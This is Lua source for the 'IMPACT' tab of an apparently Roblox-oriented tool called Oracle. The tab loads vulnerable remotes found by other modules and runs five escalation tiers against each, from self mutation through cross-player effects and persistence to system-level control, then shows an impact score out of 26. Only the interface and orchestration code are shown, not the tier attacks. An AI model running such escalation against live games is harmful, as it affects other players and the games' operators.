-- tier node display
local function setTierState(tierNum, state)
    -- state: "idle" | "running" | "pass" | "fail" | "skip"
    local node = TIER_NODES[tierNum]
    if not node then return end
    local col = state=="pass"    and TIER_COLS[tierNum] or
                state=="fail"    and Color3.fromRGB(60,30,30) or
                state=="running" and Color3.fromRGB(200,180,60) or
                state=="skip"    and Color3.fromRGB(60,60,80) or
                C.BORDER
    local txtcol = state=="pass" and TIER_COLS[tierNum] or
                   state=="fail" and Color3.fromRGB(100,50,50) or
                   state=="running" and Color3.fromRGB(200,180,60) or
                   C.MUTED
    tw(node.dot, TI.fast, {BackgroundColor3=col})
    node.lbl.TextColor3 = txtcol
end

local function resetTiers()
    for i=1,5 do setTierState(i,"idle") end
    SCORE_LBL.Text="SCORE  0 / 26"
    SCORE_LBL.TextColor3=C.MUTED
    CAT_LBL.Text="NONE"
    CAT_LBL.TextColor3=C.MUTED
end

local function updateScore(score)
    local cat = getCategory(score)
    SCORE_LBL.Text=("SCORE  %d / 26"):format(score)
    SCORE_LBL.TextColor3=cat.col
    CAT_LBL.Text=cat.label
    CAT_LBL.TextColor3=cat.col
end

-- state
local running     = false
local aborted     = false
local harvestedFindings = {}
local selFinding  = nil
local IMPACT_MAP  = {}

STOP_BTN.MouseButton1Click:Connect(function()
    aborted=true; running=false
    IMP_STATUS.Text="stopped"; IMP_STATUS.TextColor3=C.MUTED
end)

-- ── finding card builder ──────────────────────────────────────────────────────
local function buildFindingCard(f, ord, onSelect)
    local hasResult = IMPACT_MAP[f.remote or f.name or ""]
    local res       = hasResult
    local score     = res and res.score or 0
    local cat       = getCategory(score)
    local col       = res and cat.col or f.col or C.BORDER

    local card=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=selFinding==f and Color3.fromRGB(14,10,10) or C.CARD,
        BorderSizePixel=0,Text="",
        Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
        ZIndex=4,LayoutOrder=ord},LEFT_SCROLL)
    corner(6,card); stroke(col,1,card); pad(8,6,card); listV(card,4)

    local hrow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
        Size=UDim2.new(1,0,0,16),ZIndex=5,LayoutOrder=1},card)
    listH(hrow,5)
    local badge=mk("Frame",{BackgroundColor3=f.col or col,BorderSizePixel=0,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=6},hrow)
    corner(3,badge)
    mk("UIPadding",{PaddingLeft=UDim.new(0,3),PaddingRight=UDim.new(0,3)},badge)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=f.source,TextColor3=Color3.fromRGB(8,8,12),TextSize=7,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=7},badge)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=f.remote or f.name or "?",TextColor3=col,TextSize=10,
        Size=UDim2.new(1,-80,1,0),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=6,LayoutOrder=2},hrow)

    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
        Text=f.label,TextColor3=C.MUTED,TextSize=8,
        Size=UDim2.new(1,0,0,12),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=5,LayoutOrder=2},card)

    if res then
        -- Mini tier indicators
        local tierRow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
            Size=UDim2.new(1,0,0,12),ZIndex=5,LayoutOrder=3},card)
        listH(tierRow,3)
        for ti=1,5 do
            local tp=res.tiers and res.tiers[ti]
            local dc=tp and tp.pass  and TIER_COLS[ti] or
                     tp and tp.skipped and Color3.fromRGB(60,60,80) or
                     Color3.fromRGB(40,30,30)
            local td=mk("Frame",{BackgroundColor3=dc,BorderSizePixel=0,
                Size=UDim2.fromOffset(10,10),ZIndex=6,LayoutOrder=ti},tierRow)
            corner(6,td)
        end
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=cat.label.." ("..score..")",TextColor3=cat.col,TextSize=8,
            Size=UDim2.new(1,-60,1,0),TextXAlignment=Enum.TextXAlignment.Right,
            ZIndex=6,LayoutOrder=6},tierRow)
    end

    card.MouseButton1Click:Connect(function()
        selFinding=f
        if onSelect then onSelect(f) end
    end)
end

local function rebuildFindingList(onSelect)
    for _,c in ipairs(LEFT_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    LEFT_EMPTY.Visible = #harvestedFindings == 0
    for i,f in ipairs(harvestedFindings) do
        buildFindingCard(f, i, onSelect)
    end
end

-- ── run tiers against one finding ─────────────────────────────────────────────
local function runAllTiers(finding, logFn)
    resetTiers()
    local score    = 0
    local tierData = {}

    addLogSep(("IMPACT: %s via %s"):format(finding.label, finding.remote or finding.name or "?"))

    for ti=1,5 do
        if aborted then break end
        setTierState(ti, "running")
        tw(PROG_BAR,TI.fast,{Size=UDim2.new((ti-1)/5,0,1,0)})
        IMP_STATUS.Text=("T%d: %s"):format(ti,
            ti==1 and "self mutation" or ti==2 and "game state" or
            ti==3 and "cross-player" or ti==4 and "persistence" or "system control")

        addLog("INFO",("Tier %d"):format(ti),
            ti==1 and "self state mutation" or
            ti==2 and "game state mutation" or
            ti==3 and "cross-player effect" or
            ti==4 and "persistence (30s wait)" or
            "system-level control")

        local result = runTier(ti, finding, addLog)
        tierData[ti] = result

        if result.skipped then
            setTierState(ti, "skip")
            addLog("INFO",("T%d SKIP: %s"):format(ti, result.reason or ""))
        elseif result.pass then
            setTierState(ti, "pass")
            score = score + TIER_WEIGHT[ti]
            addLog(ti >= 3 and "FINDING" or "INFO",
                ("T%d PASS (+%d)  running score: %d"):format(
                    ti, TIER_WEIGHT[ti], score),
                nil, ti >= 3)
        else
            setTierState(ti, "fail")
            addLog("INFO",("T%d FAIL"):format(ti))
        end

        updateScore(score)
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(ti/5,0,1,0)})
    end

    tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
    local cat = getCategory(score)
    addLogSep(("IMPACT SCORE: %d / 26  —  %s"):format(score, cat.label))

    if score > 0 then
        addLog(cat.label=="CRITICAL" or cat.label=="HIGH" and "FINDING" or "INFO",
            ("[%s] %s scored %d"):format(cat.label, finding.label, score),
            ("Path demonstrated: %s"):format(
                score>=23 and "full system control" or
                score>=16 and "persistent cross-player impact" or
                score>=9  and "cross-player effects" or
                score>=4  and "limited game impact" or
                "self-only effects"),
            score >= 9)
    end

    return {score=score, tiers=tierData, category=cat}
end

-- ── LOAD FINDINGS ─────────────────────────────────────────────────────────────
LOAD_BTN.MouseButton1Click:Connect(function()
    harvestedFindings = harvestFindings()
    IMPACT_MAP        = {}
    clearLog()
    resetTiers()
    selFinding = nil

    rebuildFindingList(function(f)
        -- clicking a card shows its existing result if any
        local key = f.remote or f.name or ""
        local res = IMPACT_MAP[key]
        if res then
            resetTiers()
            for ti=1,5 do
                local t=res.tiers[ti]
                if t then
                    setTierState(ti,
                        t.skipped and "skip" or t.pass and "pass" or "fail")
                end
            end
            updateScore(res.score)
        end
    end)

    -- Count sources
    local sources = {}
    for _, f in ipairs(harvestedFindings) do
        sources[f.source] = (sources[f.source] or 0) + 1
    end
    local srcStr = ""
    for src, n in pairs(sources) do
        srcStr = srcStr..src.."("..n..")  "
    end

    if #harvestedFindings == 0 then
        addLog("INFO","No confirmed findings in any vector module",
            "Run DSCHAN, MSGBUS, MODCACHE, REQCANARY, SCRIPTTOGGLE, or BINDREACH first")
        IMP_STATUS.Text="no findings — run vector modules first"
        IMP_STATUS.TextColor3=C.MUTED
    else
        addLog("INFO",
            ("%d confirmed finding(s) loaded"):format(#harvestedFindings),
            srcStr:sub(1,80))
        IMP_STATUS.Text=#harvestedFindings.." finding(s) loaded"
        IMP_STATUS.TextColor3=Color3.fromRGB(255,40,40)
        addLog("INFO",
            "Select a finding and press Run All Tiers",
            "Or press Run All Tiers to process every finding sequentially")
    end
end)

-- ── RUN ALL TIERS ─────────────────────────────────────────────────────────────
RUN_BTN.MouseButton1Click:Connect(function()
    if running then return end
    if #harvestedFindings == 0 then
        addLog("INFO","Load findings first"); return
    end

    running=true; aborted=false
    clearLog()
    tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,10,10)})
    IMP_STATUS.Text="running tiers..."; IMP_STATUS.TextColor3=Color3.fromRGB(255,40,40)

    -- Process selected finding, or all if none selected
    local targets = selFinding and {selFinding} or harvestedFindings
    addLogSep(("IMPACT — %d finding(s)"):format(#targets))

    task.spawn(function()
        local highestScore = 0
        local highestCat   = getCategory(0)

        for i, finding in ipairs(targets) do
            if aborted then break end
            local key = finding.remote or finding.name or tostring(i)

            tw(PROG_BAR,TI.fast,{Size=UDim2.new((i-1)/#targets,0,1,0)})
            IMP_STATUS.Text=("finding %d/%d: %s"):format(i,#targets,finding.label)

            local result = runAllTiers(finding, addLog)
            IMPACT_MAP[key] = result

            if result.score > highestScore then
                highestScore = result.score
                highestCat   = result.category
            end

            -- Rebuild the finding card with results
            rebuildFindingList(function(f)
                local fkey = f.remote or f.name or ""
                local res  = IMPACT_MAP[fkey]
                if res then
                    resetTiers()
                    for ti=1,5 do
                        local t=res.tiers[ti]
                        if t then
                            setTierState(ti,
                                t.skipped and "skip" or t.pass and "pass" or "fail")
                        end
                    end
                    updateScore(res.score)
                end
            end)
        end

        -- Final summary
        addLogSep(("IMPACT COMPLETE — highest score: %d/%d  [%s]"):format(
            highestScore, 26, highestCat.label))
        IMP_STATUS.Text=("MAX: %d/26  %s"):format(highestScore, highestCat.label)
        IMP_STATUS.TextColor3=highestCat.col
        tw(RUN_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,40,40)})
        running=false
    end)
end)

-- export
G.IMPACT_MAP     = IMPACT_MAP
G.impact_harvest = harvestFindings
G.impact_runTier = runTier

if G.addTab then
    G.addTab("impact","IMPACT",P_IMP)
else
    warn("[Oracle] G.addTab not found")
end
